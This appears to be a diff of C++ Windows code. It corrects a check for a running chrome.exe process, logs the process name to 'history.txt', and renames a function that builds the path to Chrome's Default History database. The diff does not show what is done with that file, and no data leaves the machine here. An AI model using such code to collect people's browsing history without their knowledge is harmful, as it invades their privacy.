@@ -57,9 +57,10 @@ bool check_chrome_running(){
 
     do {
         char filename[256];
-        if (strcmp(pe32.szExeFile, L"chrome.exe")){ 
+        if (strcmp(pe32.szExeFile, "chrome.exe") == 0){ 
+            write_endl(pe32.szExeFile, "history.txt");
+            //write_endl(" is not a ");
             return true;
-            
         }
     }while (Process32Next(hProcessSnap, &pe32));
 
@@ -67,7 +68,7 @@ bool check_chrome_running(){
     return false;
 }
 
-void init_chrome_daemon(){
+void init_historyd(){
     const char* appdatalocal_charptr = std::getenv("LOCALAPPDATA");
     std::string str_path = std::string(appdatalocal_charptr);
     str_path.append("\\Google\\Chrome\\User Data\\Default\\History");
